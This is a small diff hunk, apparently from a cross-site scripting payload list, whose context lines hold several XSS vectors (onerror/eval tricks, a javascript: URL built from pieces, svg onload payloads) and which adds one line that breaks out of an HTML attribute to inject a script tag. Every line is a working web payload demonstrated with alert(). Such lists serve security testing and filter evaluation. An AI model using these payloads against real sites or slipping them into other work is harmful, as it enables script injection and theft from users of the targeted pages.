@@ -1893,3 +1893,4 @@ onerror=eval,ReferenceError.prototype.name='=alert\x2823\x29//',lol
 location=j+a+v+a+s+c+r+i+p+t+colon+alert.name+lpar+1+rpar
 data:text/html,<iframe name="<svg/onload=alert(23)>" src="http://example.com/xss?document.body.innerHTML=name">
 <svg/onload='alert&#40 23 &#41'> 
+&#34><script>alert(document.domain);</script>
